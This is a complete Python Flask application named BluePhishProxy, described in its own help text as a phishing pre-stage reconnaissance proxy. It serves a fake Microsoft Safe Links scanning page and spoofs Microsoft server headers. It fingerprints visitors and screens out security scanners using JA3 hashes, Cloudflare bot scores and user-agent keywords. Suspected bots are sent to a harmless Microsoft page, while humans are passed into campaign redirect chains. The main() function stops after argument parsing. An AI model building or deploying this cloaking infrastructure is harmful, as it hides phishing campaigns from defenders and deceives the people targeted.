import argparse
import datetime
import hashlib
import ipaddress
import json
import logging
import os
import random
import re
import secrets
import sqlite3
import ssl
import uuid
from functools import wraps

import requests
from flask import (
    Flask, request, session, redirect, make_response, jsonify, g
)
from werkzeug.middleware.proxy_fix import ProxyFix

###############################################################################
# CONFIGURATION
###############################################################################

def _bool_env(key, default=False):
    return os.environ.get(key, str(default)).lower() in ("1", "true", "yes")

class Config:
    SECRET_KEY = os.environ.get("BPP_SECRET_KEY", secrets.token_hex(32))

    SAFE_REDIRECT_URL = os.environ.get(
        "BPP_SAFE_REDIRECT", "https://www.microsoft.com/en-us/security"
    )
    OPERATOR_TOKEN = os.environ.get("BPP_OPERATOR_TOKEN", "")

    DATABASE_URL = os.environ.get("BPP_DATABASE_URL", "data/bluephishproxy.db")

    BEHIND_CLOUDFLARE = _bool_env("BPP_BEHIND_CLOUDFLARE")

    TLS_CERT = os.environ.get("BPP_TLS_CERT", "")
    TLS_KEY = os.environ.get("BPP_TLS_KEY", "")

    CAMPAIGN_NAME = os.environ.get("BPP_CAMPAIGN_NAME", "")
    CAMPAIGN_TEMPLATE = os.environ.get("BPP_CAMPAIGN_TEMPLATE", "safelinks")

    REDIRECT_CHAIN = os.environ.get("BPP_REDIRECT_CHAIN", "")

    RATE_LIMIT_RPM = int(os.environ.get("BPP_RATE_LIMIT_RPM", "60"))


MS_SERVER_TYPES = ["Microsoft-IIS/10.0", "Microsoft-HTTPAPI/2.0"]
MS_POWERED_BY = ["ASP.NET", "ARR/3.0", "ASP.NET 4.8"]

KNOWN_SCANNER_JA3 = {
    "e7d705a3286e19ea42f587b344ee6865",
    "6734f37431670b3ab4292b8f60f29984",
    "cd08e31494f9531f560d64c695473da9",
    "b32309a26951912be7dba376398abc3b",
    "3b5074b1b5d032e5620f69f9f700ff0e",
    "a0e9f5d64349fb13191bc781f81f42e1",
}

###############################################################################
# APPLICATION FACTORY
###############################################################################

app = Flask(__name__)
app.config.from_object(Config)
app.secret_key = Config.SECRET_KEY
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_host=1)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler("access.log"),
        logging.StreamHandler(),
    ],
)

ip_info_cache: dict = {}

###############################################################################
# DATABASE LAYER (sqlite3 stdlib)
###############################################################################

def _db_path():
    return app.config.get("DATABASE_URL", Config.DATABASE_URL)


def get_db():
    if "db" not in g:
        path = _db_path()
        os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
        g.db = sqlite3.connect(path)
        g.db.row_factory = sqlite3.Row
        g.db.execute("PRAGMA journal_mode=WAL")
        g.db.execute("PRAGMA foreign_keys=ON")
    return g.db


@app.teardown_appcontext
def close_db(_exc):
    db = g.pop("db", None)
    if db:
        db.close()


def init_db():
    db_path = _db_path()
    os.makedirs(os.path.dirname(db_path) or ".", exist_ok=True)
    conn = sqlite3.connect(db_path)
    conn.executescript("""
        CREATE TABLE IF NOT EXISTS visits (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id  TEXT NOT NULL,
            ip_address  TEXT NOT NULL,
            user_agent  TEXT,
            asn         TEXT,
            org         TEXT,
            country     TEXT,
            region      TEXT,
            city        TEXT,
            hostname    TEXT,
            loc         TEXT,
            path        TEXT,
            method      TEXT,
            referrer    TEXT,
            browser     TEXT,
            browser_ver TEXT,
            os          TEXT,
            device      TEXT,
            is_bot      INTEGER DEFAULT 0,
            bot_kind    TEXT,
            headers     TEXT,
            cookies     TEXT,
            args        TEXT,
            advanced_metrics TEXT,
            signals     TEXT,
            campaign    TEXT,
            created_at  TEXT NOT NULL DEFAULT (datetime('now'))
        );
        CREATE INDEX IF NOT EXISTS idx_visits_ip ON visits(ip_address);
        CREATE INDEX IF NOT EXISTS idx_visits_created ON visits(created_at);
        CREATE INDEX IF NOT EXISTS idx_visits_campaign ON visits(campaign);
        CREATE INDEX IF NOT EXISTS idx_visits_bot ON visits(is_bot);

        CREATE TABLE IF NOT EXISTS campaigns (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            name        TEXT UNIQUE NOT NULL,
            template    TEXT NOT NULL DEFAULT 'safelinks',
            redirect_chain TEXT,
            created_at  TEXT NOT NULL DEFAULT (datetime('now')),
            active      INTEGER DEFAULT 1
        );

        CREATE TABLE IF NOT EXISTS analytics (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            date        TEXT NOT NULL,
            campaign    TEXT,
            total       INTEGER DEFAULT 0,
            bots        INTEGER DEFAULT 0,
            humans      INTEGER DEFAULT 0,
            browsers    TEXT DEFAULT '{}',
            os_stats    TEXT DEFAULT '{}',
            countries   TEXT DEFAULT '{}',
            asns        TEXT DEFAULT '{}',
            paths       TEXT DEFAULT '{}',
            bot_types   TEXT DEFAULT '{}',
            hourly      TEXT DEFAULT '{}',
            UNIQUE(date, campaign)
        );

        CREATE TABLE IF NOT EXISTS api_keys (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            key_hash    TEXT UNIQUE NOT NULL,
            name        TEXT NOT NULL,
            role        TEXT NOT NULL DEFAULT 'read-only',
            created_at  TEXT NOT NULL DEFAULT (datetime('now')),
            last_used   TEXT,
            revoked     INTEGER DEFAULT 0
        );

        CREATE TABLE IF NOT EXISTS rate_limits (
            key_hash    TEXT NOT NULL,
            window      TEXT NOT NULL,
            count       INTEGER DEFAULT 1,
            PRIMARY KEY (key_hash, window)
        );
    """)
    conn.commit()
    conn.close()


###############################################################################
# AUTHENTICATION
###############################################################################

def hash_api_key(key: str) -> str:
    return hashlib.sha256(key.encode()).hexdigest()


def create_api_key(name: str, role: str = "read-only") -> str:
    raw = secrets.token_urlsafe(32)
    h = hash_api_key(raw)
    db = get_db()
    db.execute(
        "INSERT INTO api_keys (key_hash, name, role) VALUES (?, ?, ?)",
        (h, name, role),
    )
    db.commit()
    return raw


def verify_api_key(key: str):
    h = hash_api_key(key)
    db = get_db()
    row = db.execute(
        "SELECT * FROM api_keys WHERE key_hash = ? AND revoked = 0", (h,)
    ).fetchone()
    if row:
        db.execute(
            "UPDATE api_keys SET last_used = datetime('now') WHERE key_hash = ?",
            (h,),
        )
        db.commit()
    return row


def check_rate_limit(key_hash: str, rpm: int) -> bool:
    window = datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M")
    db = get_db()
    row = db.execute(
        "SELECT count FROM rate_limits WHERE key_hash = ? AND window = ?",
        (key_hash, window),
    ).fetchone()
    if row and row["count"] >= rpm:
        return False
    db.execute(
        """INSERT INTO rate_limits (key_hash, window, count) VALUES (?, ?, 1)
           ON CONFLICT(key_hash, window) DO UPDATE SET count = count + 1""",
        (key_hash, window),
    )
    db.commit()
    return True


def require_auth(role="read-only"):
    def decorator(fn):
        @wraps(fn)
        def wrapper(*args, **kwargs):
            token = (
                request.headers.get("Authorization", "").removeprefix("Bearer ").strip()
                or request.args.get("token", "")
            )
            if not token:
                return jsonify({"error": "missing auth"}), 401

            if Config.OPERATOR_TOKEN and token == Config.OPERATOR_TOKEN:
                g.auth_role = "admin"
                g.auth_key_hash = "operator"
            else:
                row = verify_api_key(token)
                if not row:
                    return jsonify({"error": "invalid key"}), 403
                g.auth_role = row["role"]
                g.auth_key_hash = row["key_hash"]

            if role == "admin" and g.auth_role != "admin":
                return jsonify({"error": "admin required"}), 403

            if not check_rate_limit(g.auth_key_hash, Config.RATE_LIMIT_RPM):
                return jsonify({"error": "rate limit exceeded"}), 429

            return fn(*args, **kwargs)
        return wrapper
    return decorator


###############################################################################
# CLOUDFLARE SIGNAL PRODUCER
###############################################################################

def signals_from_cloudflare(headers: dict) -> dict:
    signals = {}
    if not Config.BEHIND_CLOUDFLARE:
        return signals

    cf_ip = headers.get("Cf-Connecting-Ip")
    if cf_ip:
        signals["cf_real_ip"] = cf_ip

    cf_country = headers.get("Cf-Ipcountry")
    if cf_country:
        signals["cf_country"] = cf_country

    cf_worker = headers.get("Cf-Worker")
    if cf_worker:
        signals["cf_worker"] = cf_worker
        signals["automation_hint"] = "cf-worker-present"

    bot_score = headers.get("Cf-Bot-Score")
    if bot_score:
        try:
            signals["cf_bot_score"] = int(bot_score)
        except ValueError:
            pass

    bot_tag = headers.get("Cf-Bot-Management-Tag")
    if bot_tag:
        signals["cf_bot_tag"] = bot_tag

    return signals


###############################################################################
# EVASION COUNTERS — JA3 / HTTP2 / SCANNER DETECTION
###############################################################################

def evasion_signals(headers: dict) -> dict:
    signals = {}

    ja3 = headers.get("X-Ja3-Fingerprint") or headers.get("Cf-Ja3-Fingerprint")
    if ja3:
        signals["ja3"] = ja3
        if ja3 in KNOWN_SCANNER_JA3:
            signals["known_scanner_ja3"] = True

    if headers.get("X-Http2", "").lower() == "true" or "h2" in headers.get(
        "X-Forwarded-Proto-Version", ""
    ):
        signals["http2"] = True

    via = headers.get("Via", "")
    if "2 " in via or "2.0" in via:
        signals["http2"] = True

    return signals


###############################################################################
# IP / ASN LOOKUP
###############################################################################

def get_asn_info(ip: str) -> dict:
    if ip in ip_info_cache:
        return ip_info_cache[ip]

    try:
        addr = ipaddress.ip_address(ip)
        if addr.is_private:
            data = {"asn": "Private", "org": "Private Network", "country": "Local"}
        else:
            r = requests.get(f"https://ipinfo.io/{ip}/json", timeout=3)
            if r.status_code == 200:
                raw = r.json()
                org_val = raw.get("org", "Unknown")
                parts = org_val.split(" ")
                data = {
                    "asn": parts[0] if parts else "Unknown",
                    "org": " ".join(parts[1:]) if len(parts) > 1 else "Unknown",
                    "country": raw.get("country", "Unknown"),
                    "region": raw.get("region", "Unknown"),
                    "city": raw.get("city", "Unknown"),
                    "hostname": raw.get("hostname", "Unknown"),
                    "loc": raw.get("loc", "Unknown"),
                }
            else:
                data = {"asn": "Unknown", "org": "Unknown", "country": "Unknown"}
    except Exception:
        data = {"asn": "Error", "org": "Error", "country": "Error"}

    ip_info_cache[ip] = data
    return data


###############################################################################
# USER AGENT PARSING
###############################################################################

def parse_user_agent(ua: str) -> dict:
    result = {
        "browser": "Unknown",
        "browser_version": "Unknown",
        "os": "Unknown",
        "device": "Desktop",
    }
    if "Mobile" in ua:
        result["device"] = "Mobile"
    elif "Tablet" in ua:
        result["device"] = "Tablet"

    patterns = {
        "Edge": r"Edg[e]?/(\d+\.\d+)",
        "Chrome": r"Chrome/(\d+\.\d+)",
        "Firefox": r"Firefox/(\d+\.\d+)",
        "Safari": r"Version/(\d+\.\d+).*Safari",
        "MSIE": r"MSIE (\d+\.\d+)",
        "Opera": r"Opera[/ ](\d+\.\d+)",
    }
    for b, pat in patterns.items():
        m = re.search(pat, ua)
        if m:
            result["browser"] = b
            result["browser_version"] = m.group(1)
            break

    ua_lower = ua.lower()
    if "windows" in ua_lower:
        result["os"] = "Windows"
    elif "mac os x" in ua_lower:
        result["os"] = "macOS"
    elif "iphone" in ua_lower:
        result["os"] = "iOS"
    elif "android" in ua_lower:
        result["os"] = "Android"
    elif "linux" in ua_lower:
        result["os"] = "Linux"

    return result


###############################################################################
# GATHER CLIENT INFO
###############################################################################

def get_client_info() -> dict:
    headers = dict(request.headers)

    if Config.BEHIND_CLOUDFLARE and headers.get("Cf-Connecting-Ip"):
        ip = headers["Cf-Connecting-Ip"]
    else:
        ip = request.headers.get("X-Forwarded-For", request.remote_addr)
        if ip and "," in ip:
            ip = ip.split(",")[0].strip()

    ua = request.headers.get("User-Agent", "Unknown")
    asn = get_asn_info(ip)

    info = {
        "ip_address": ip,
        "user_agent": ua,
        "asn": asn.get("asn", "Unknown"),
        "org": asn.get("org", "Unknown"),
        "country": asn.get("country", "Unknown"),
        "region": asn.get("region", "Unknown"),
        "city": asn.get("city", "Unknown"),
        "hostname": asn.get("hostname", "Unknown"),
        "loc": asn.get("loc", "Unknown"),
        "timestamp": datetime.datetime.now().isoformat(),
        "headers": headers,
        "cookies": dict(request.cookies),
        "path": request.path,
        "method": request.method,
        "args": dict(request.args),
        "referrer": request.referrer,
    }
    info.update(parse_user_agent(ua))

    cf_signals = signals_from_cloudflare(headers)
    ev_signals = evasion_signals(headers)
    info["signals"] = {**cf_signals, **ev_signals}

    if cf_signals.get("cf_country"):
        info["country"] = cf_signals["cf_country"]

    return info


###############################################################################
# REDIRECT CHAINS
###############################################################################

def _load_redirect_chain(campaign: str = None) -> list | None:
    if campaign:
        db = get_db()
        row = db.execute(
            "SELECT redirect_chain FROM campaigns WHERE name = ?", (campaign,)
        ).fetchone()
        if row and row["redirect_chain"]:
            try:
                return json.loads(row["redirect_chain"])
            except (json.JSONDecodeError, TypeError):
                pass

    raw = Config.REDIRECT_CHAIN
    if raw:
        try:
            return json.loads(raw)
        except (json.JSONDecodeError, TypeError):
            pass
    return None


def _chain_for_classification(chain_config: list, classification: str) -> list | None:
    for entry in chain_config:
        if entry.get("match") == classification:
            return entry.get("steps", [])
    return None


def render_redirect_chain(steps: list) -> str:
    js_steps = json.dumps(steps)
    return f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Redirecting...</title>
<style>body{{margin:0;font-family:Segoe UI,sans-serif;background:#f2f2f2;
display:flex;align-items:center;justify-content:center;min-height:100vh}}
.c{{background:#fff;padding:40px;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,.1);
text-align:center;max-width:400px}}
.spinner{{margin:20px auto;width:30px;height:30px;border:3px solid #ccc;
border-top:3px solid #0078d4;border-radius:50%;animation:s 1s linear infinite}}
@keyframes s{{0%{{transform:rotate(0)}}100%{{transform:rotate(360deg)}}}}</style></head>
<body><div class="c"><p>Verifying access...</p><div class="spinner"></div></div>
<script>
(function(){{
  var steps={js_steps};
  var i=0;
  function next(){{
    if(i>=steps.length)return;
    var s=steps[i];i++;
    if(s.type==="delay"){{setTimeout(next,s.ms||1000)}}
    else if(s.type==="redirect"){{window.location=s.url}}
  }}
  next();
}})();
</script></body></html>"""


###############################################################################
# ANALYTICS (SQLite)
###############################################################################

def update_analytics(info: dict, campaign: str = None):
    today = datetime.datetime.now().strftime("%Y-%m-%d")
    db = get_db()

    row = db.execute(
        "SELECT * FROM analytics WHERE date = ? AND campaign IS ?",
        (today, campaign),
    ).fetchone()

    if row:
        browsers = json.loads(row["browsers"])
        os_stats = json.loads(row["os_stats"])
        countries = json.loads(row["countries"])
        asns = json.loads(row["asns"])
        paths = json.loads(row["paths"])
        bot_types = json.loads(row["bot_types"])
        hourly = json.loads(row["hourly"])
        total = row["total"]
        bots = row["bots"]
        humans = row["humans"]
    else:
        browsers, os_stats, countries, asns, paths, bot_types = {}, {}, {}, {}, {}, {}
        hourly = {str(h): 0 for h in range(24)}
        total = bots = humans = 0

    total += 1
    if info.get("is_bot"):
        bots += 1
        bk = info.get("bot_kind", "Unknown")
        bot_types[bk] = bot_types.get(bk, 0) + 1
    else:
        humans += 1

    br = info.get("browser", "Unknown")
    browsers[br] = browsers.get(br, 0) + 1
    o = info.get("os", "Unknown")
    os_stats[o] = os_stats.get(o, 0) + 1
    c = info.get("country", "Unknown")
    countries[c] = countries.get(c, 0) + 1
    a = info.get("asn", "Unknown")
    asns[a] = asns.get(a, 0) + 1
    p = info.get("path", "/")
    paths[p] = paths.get(p, 0) + 1
    h = datetime.datetime.now().hour
    hourly[str(h)] = hourly.get(str(h), 0) + 1

    if row:
        db.execute(
            """UPDATE analytics SET total=?, bots=?, humans=?,
               browsers=?, os_stats=?, countries=?, asns=?,
               paths=?, bot_types=?, hourly=?
               WHERE id=?""",
            (
                total, bots, humans,
                json.dumps(browsers), json.dumps(os_stats),
                json.dumps(countries), json.dumps(asns),
                json.dumps(paths), json.dumps(bot_types),
                json.dumps(hourly), row["id"],
            ),
        )
    else:
        db.execute(
            """INSERT INTO analytics (date, campaign, total, bots, humans,
               browsers, os_stats, countries, asns, paths, bot_types, hourly)
               VALUES (?,?,?,?,?,?,?,?,?,?,?,?)""",
            (
                today, campaign, total, bots, humans,
                json.dumps(browsers), json.dumps(os_stats),
                json.dumps(countries), json.dumps(asns),
                json.dumps(paths), json.dumps(bot_types),
                json.dumps(hourly),
            ),
        )
    db.commit()


###############################################################################
# LOG VISIT
###############################################################################

SUSPICIOUS_TOKENS = [
    "bot", "crawler", "spider", "headless", "phantom", "selenium",
    "webdriver", "python-requests", "httpclient", "java", "curl", "wget",
    "scrapy", "go-http-client", "libwww-perl", "lwp", "http.request",
    "fetch", "aiohttp", "okhttp", "powershell", "node-fetch", "perl",
    "ruby", "mechanize", "http.rb", "axios", "cfnetwork", "urlgrabber",
    "pycurl", "masscan", "nmap", "httpx", "bench", "scan",
]


def log_visit(info: dict, session_id: str, is_bot: bool = False,
              bot_kind: str = "Unknown", campaign: str = None):
    role = "BOT" if is_bot else "HUMAN"
    msg = (
        f"{role}: SID={session_id}, IP={info['ip_address']}, "
        f"ORG={info['org']}, Country={info['country']}, "
        f"UA={info['browser']} {info['browser_version']} on {info['os']}"
    )
    if is_bot:
        msg += f", TYPE={bot_kind}"
        logging.warning(msg)
    else:
        logging.info(msg)

    info["session_id"] = session_id
    info["is_bot"] = is_bot
    info["bot_kind"] = bot_kind

    db = get_db()
    db.execute(
        """INSERT INTO visits
           (session_id, ip_address, user_agent, asn, org, country, region,
            city, hostname, loc, path, method, referrer, browser, browser_ver,
            os, device, is_bot, bot_kind, headers, cookies, args,
            advanced_metrics, signals, campaign)
           VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)""",
        (
            session_id, info["ip_address"], info["user_agent"],
            info["asn"], info["org"], info["country"],
            info.get("region"), info.get("city"), info.get("hostname"),
            info.get("loc"), info.get("path"), info.get("method"),
            info.get("referrer"), info.get("browser"),
            info.get("browser_version"), info.get("os"), info.get("device"),
            1 if is_bot else 0, bot_kind,
            json.dumps(info.get("headers", {})),
            json.dumps(info.get("cookies", {})),
            json.dumps(info.get("args", {})),
            json.dumps(info.get("advanced_metrics", {})),
            json.dumps(info.get("signals", {})),
            campaign,
        ),
    )
    db.commit()
    update_analytics(info, campaign)


###############################################################################
# SERVER HEADERS
###############################################################################

def ms_headers() -> dict:
    return {
        "Server": random.choice(MS_SERVER_TYPES),
        "X-Powered-By": random.choice(MS_POWERED_BY),
        "X-AspNet-Version": "4.0.30319",
        "X-MS-InvokeApp": "1; RequireReadOnly",
        "X-Content-Type-Options": "nosniff",
        "X-Frame-Options": "SAMEORIGIN",
        "X-XSS-Protection": "1; mode=block",
        "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
    }


###############################################################################
# BOT DECORATOR
###############################################################################

def detect_bots(func):
    @wraps(func)
    def wrapper(*args, **kwargs):
        session_id = request.cookies.get("csession", str(uuid.uuid4()))
        client_info = get_client_info()
        campaign = _active_campaign()

        ua_lower = client_info["user_agent"].lower()
        is_bot = False
        bot_kind = "Unknown"

        for t in SUSPICIOUS_TOKENS:
            if t in ua_lower:
                is_bot = True
                bot_kind = f"UserAgent:{t.capitalize()}"
                break

        signals = client_info.get("signals", {})
        if signals.get("known_scanner_ja3"):
            is_bot = True
            bot_kind = f"JA3:{signals.get('ja3', 'unknown')}"

        if signals.get("cf_bot_score") is not None:
            if signals["cf_bot_score"] < 30:
                is_bot = True
                bot_kind = f"CF-BotScore:{signals['cf_bot_score']}"

        if signals.get("cf_worker"):
            is_bot = True
            bot_kind = "CF-Worker"

        adv = session.get("adv_metrics")
        if adv:
            client_info["advanced_metrics"] = adv
            if adv.get("webdriver"):
                is_bot = True
                bot_kind = "JS:webdriver"
            if adv.get("mouseMoves", 0) < 1:
                is_bot = True
                bot_kind = "JS:noMouse"

        log_visit(client_info, session_id, is_bot, bot_kind, campaign)

        g.is_bot = is_bot
        g.bot_kind = bot_kind
        g.client_info = client_info
        g.campaign = campaign

        original_result = func(*args, **kwargs)

        if hasattr(original_result, "set_cookie") and hasattr(
            original_result, "headers"
        ):
            response = original_result
        elif isinstance(original_result, tuple):
            length = len(original_result)
            if length == 3:
                body, status_code, custom_headers = original_result
            elif length == 2:
                body, status_code = original_result
                custom_headers = {}
            else:
                body = original_result[0]
                status_code = 200
                custom_headers = {}
            response = make_response(body, status_code)
            for k, v in custom_headers.items():
                response.headers[k] = v
        else:
            response = make_response(original_result, 200)

        response.set_cookie("csession", session_id, max_age=3600)
        for k, v in ms_headers().items():
            response.headers[k] = v

        return response

    return wrapper


###############################################################################
# SINGLE CAMPAIGN FOCUS
###############################################################################

def _active_campaign() -> str | None:
    name = Config.CAMPAIGN_NAME
    if not name:
        return None
    db = get_db()
    row = db.execute("SELECT name FROM campaigns WHERE name = ?", (name,)).fetchone()
    if not row:
        db.execute(
            "INSERT OR IGNORE INTO campaigns (name, template) VALUES (?, ?)",
            (name, Config.CAMPAIGN_TEMPLATE),
        )
        db.commit()
    return name


###############################################################################
# SCAN PAGE
###############################################################################

def render_scan_page():
    return """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Microsoft Link Protection</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      font-family: Segoe UI, Tahoma, Geneva, Verdana, sans-serif;
      background-color: #f2f2f2;
      display: flex; flex-direction: column;
      align-items: center; justify-content: center;
      min-height: 100vh;
    }
    .container {
      background: white; padding: 40px 30px;
      border-radius: 6px; box-shadow: 0 2px 8px rgba(0,0,0,0.1);
      text-align: center; max-width: 420px; width: 90%;
    }
    .logo { width: 160px; margin-bottom: 20px; }
    h1 { font-size: 22px; margin-bottom: 10px; color: #262626; }
    p  { font-size: 15px; color: #555; }
    .spinner {
      margin: 30px auto 10px; width: 40px; height: 40px;
      border: 4px solid #c8c8c8; border-top: 4px solid #0078d4;
      border-radius: 50%; animation: spin 1s linear infinite;
    }
    @keyframes spin { 0%{transform:rotate(0)} 100%{transform:rotate(360deg)} }
    .footer { margin-top: 30px; font-size: 12px; color: #999; }
  </style>
</head>
<body>
  <div class="container">
    <img class="logo"
         src="https://logincdn.msauth.net/16.000.30820.2/images/microsoft_logo_138.png"
         alt="Microsoft">
    <h1>Verifying your link...</h1>
    <p>This link is being scanned to ensure it is safe. Please wait.</p>
    <div class="spinner"></div>
    <div class="footer">Microsoft Safe Links</div>
  </div>
  <script>
    var adv = {
      windowSize: [window.innerWidth, window.innerHeight],
      screenSize: [screen.width, screen.height],
      webdriver: (navigator.webdriver === true),
      mouseMoves: 0,
      touchEvents: 'ontouchstart' in window,
      languages: navigator.languages ? navigator.languages.slice() : [],
      pluginCount: navigator.plugins ? navigator.plugins.length : 0,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
    };
    document.addEventListener('mousemove', function() { adv.mouseMoves++; });
    function sendData() {
      fetch('/api/v2/metrics/collect', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(adv)
      })
      .then(function() {
        window.location = '/evergreen-assets/safelinks/1/atp-safelinks.html';
      })
      .catch(function() {
        document.body.innerHTML = '<h1>Error</h1>';
      });
    }
    setTimeout(sendData, 3000);
  </script>
</body>
</html>"""


###############################################################################
# ROUTES — metrics collector
###############################################################################

@app.route("/api/v2/metrics/collect", methods=["POST"])
def collect_metrics():
    data = request.json or {}
    session["adv_metrics"] = data
    return jsonify({"status": "ok"})


###############################################################################
# ROUTES — scan page
###############################################################################

@app.route("/api/v2/metrics/usr")
@app.route("/scanning_page")
def scan_page():
    return render_scan_page()


###############################################################################
# ROUTES — catch-all (single campaign focus)
###############################################################################

@app.route("/", defaults={"uri": ""})
@app.route("/<path:uri>")
@detect_bots
def ms_catch_all(uri):
    adv = session.get("adv_metrics")
    if not adv:
        return redirect("/api/v2/metrics/usr", code=302)

    is_bot = getattr(g, "is_bot", False)
    campaign = getattr(g, "campaign", None)

    classification = "bot" if is_bot else "clean"
    if not is_bot:
        if adv.get("webdriver") or adv.get("mouseMoves", 0) < 1:
            classification = "suspicious"

    chain_cfg = _load_redirect_chain(campaign)
    if chain_cfg:
        steps = _chain_for_classification(chain_cfg, classification)
        if not steps:
            steps = _chain_for_classification(chain_cfg, "default")
        if steps:
            return render_redirect_chain(steps)

    return redirect(Config.SAFE_REDIRECT_URL, 302)


###############################################################################
# API — dashboard / analytics
###############################################################################

@app.route("/api/v1/dashboard")
@require_auth("read-only")
def api_dashboard():
    db = get_db()
    campaign = _active_campaign()

    today = datetime.datetime.now().strftime("%Y-%m-%d")
    row = db.execute(
        "SELECT * FROM analytics WHERE date = ? AND campaign IS ?",
        (today, campaign),
    ).fetchone()

    stats = {}
    if row:
        stats = {
            "date": row["date"],
            "campaign": row["campaign"],
            "total": row["total"],
            "bots": row["bots"],
            "humans": row["humans"],
            "browsers": json.loads(row["browsers"]),
            "os": json.loads(row["os_stats"]),
            "countries": json.loads(row["countries"]),
            "asns": json.loads(row["asns"]),
            "bot_types": json.loads(row["bot_types"]),
            "hourly": json.loads(row["hourly"]),
        }

    recent = db.execute(
        """SELECT session_id, ip_address, org, country, browser, os, device,
                  is_bot, bot_kind, path, created_at, campaign, signals
           FROM visits ORDER BY id DESC LIMIT 50"""
    ).fetchall()

    result = {
        "active_campaign": campaign,
        "today": stats,
        "recent_visits": [dict(r) for r in recent],
    }
    return jsonify(result)


@app.route("/api/v1/visits")
@require_auth("read-only")
def api_visits():
    db = get_db()
    limit = min(int(request.args.get("limit", 100)), 1000)
    offset = int(request.args.get("offset", 0))
    bot_only = request.args.get("bots")

    query = "SELECT * FROM visits"
    params = []
    if bot_only == "1":
        query += " WHERE is_bot = 1"
    elif bot_only == "0":
        query += " WHERE is_bot = 0"
    query += " ORDER BY id DESC LIMIT ? OFFSET ?"
    params.extend([limit, offset])

    rows = db.execute(query, params).fetchall()
    return jsonify([dict(r) for r in rows])


@app.route("/api/v1/analytics")
@require_auth("read-only")
def api_analytics():
    db = get_db()
    days = int(request.args.get("days", 7))
    rows = db.execute(
        "SELECT * FROM analytics ORDER BY date DESC LIMIT ?", (days,)
    ).fetchall()
    result = []
    for r in rows:
        d = dict(r)
        for field in ("browsers", "os_stats", "countries", "asns", "paths", "bot_types", "hourly"):
            if d.get(field):
                d[field] = json.loads(d[field])
        result.append(d)
    return jsonify(result)


###############################################################################
# API — campaign management
###############################################################################

@app.route("/api/v1/campaigns", methods=["GET"])
@require_auth("read-only")
def api_list_campaigns():
    db = get_db()
    rows = db.execute("SELECT * FROM campaigns ORDER BY id DESC").fetchall()
    return jsonify([dict(r) for r in rows])


@app.route("/api/v1/campaigns", methods=["POST"])
@require_auth("admin")
def api_create_campaign():
    data = request.json or {}
    name = data.get("name", "").strip()
    if not name:
        return jsonify({"error": "name required"}), 400
    template = data.get("template", "safelinks")
    chain = json.dumps(data.get("redirect_chain")) if data.get("redirect_chain") else None
    db = get_db()
    try:
        db.execute(
            "INSERT INTO campaigns (name, template, redirect_chain) VALUES (?, ?, ?)",
            (name, template, chain),
        )
        db.commit()
    except sqlite3.IntegrityError:
        return jsonify({"error": "campaign exists"}), 409
    return jsonify({"status": "created", "campaign": name}), 201


###############################################################################
# API — API key management
###############################################################################

@app.route("/api/v1/keys", methods=["POST"])
@require_auth("admin")
def api_create_key():
    data = request.json or {}
    name = data.get("name", "").strip()
    if not name:
        return jsonify({"error": "name required"}), 400
    role = data.get("role", "read-only")
    if role not in ("admin", "read-only"):
        return jsonify({"error": "role must be admin or read-only"}), 400
    raw = create_api_key(name, role)
    return jsonify({"key": raw, "name": name, "role": role}), 201


@app.route("/api/v1/keys", methods=["GET"])
@require_auth("admin")
def api_list_keys():
    db = get_db()
    rows = db.execute(
        "SELECT id, name, role, created_at, last_used, revoked FROM api_keys ORDER BY id DESC"
    ).fetchall()
    return jsonify([dict(r) for r in rows])


@app.route("/api/v1/keys/<int:key_id>/revoke", methods=["POST"])
@require_auth("admin")
def api_revoke_key(key_id):
    db = get_db()
    db.execute("UPDATE api_keys SET revoked = 1 WHERE id = ?", (key_id,))
    db.commit()
    return jsonify({"status": "revoked"})


###############################################################################
# CLI COMMANDS
###############################################################################

def cli_apikey(args):
    init_db()
    conn = sqlite3.connect(_db_path())
    conn.row_factory = sqlite3.Row

    if args.action == "create":
        raw = secrets.token_urlsafe(32)
        h = hash_api_key(raw)
        conn.execute(
            "INSERT INTO api_keys (key_hash, name, role) VALUES (?, ?, ?)",
            (h, args.name, args.role),
        )
        conn.commit()
        print(f"API key created: {raw}")
        print(f"  Name: {args.name}  Role: {args.role}")

    elif args.action == "list":
        rows = conn.execute(
            "SELECT id, name, role, created_at, last_used, revoked FROM api_keys ORDER BY id"
        ).fetchall()
        if not rows:
            print("No API keys found.")
        for r in rows:
            status = "REVOKED" if r["revoked"] else "active"
            print(f"  [{r['id']}] {r['name']}  role={r['role']}  "
                  f"created={r['created_at']}  last_used={r['last_used']}  {status}")

    elif args.action == "revoke":
        conn.execute("UPDATE api_keys SET revoked = 1 WHERE id = ?", (args.key_id,))
        conn.commit()
        print(f"Key {args.key_id} revoked.")

    conn.close()


###############################################################################
# ENTRYPOINT
###############################################################################

def main():
    parser = argparse.ArgumentParser(
        description="BluePhishProxy — phishing pre-stage reconnaissance proxy"
    )
    sub = parser.add_subparsers(dest="command")

    # serve
    srv = sub.add_parser("serve", help="Run the proxy server")
    srv.add_argument("--port", type=int, default=int(os.environ.get("BPP_PORT", "5000")))
    srv.add_argument("--host", default=os.environ.get("BPP_HOST", "0.0.0.0"))

    # apikey
    ak = sub.add_parser("apikey", help="Manage API keys")
    ak_sub = ak.add_subparsers(dest="action")
    cr = ak_sub.add_parser("create")
    cr.add_argument("--name", required=True)
    cr.add_argument("--role", default="read-only", choices=["admin", "read-only"])
    ak_sub.add_parser("list")
    rv = ak_sub.add_parser("revoke")
    rv.add_argument("--key-id", type=int, required=True)

    # initdb
    sub.add_parser("initdb", help="Initialize the database")

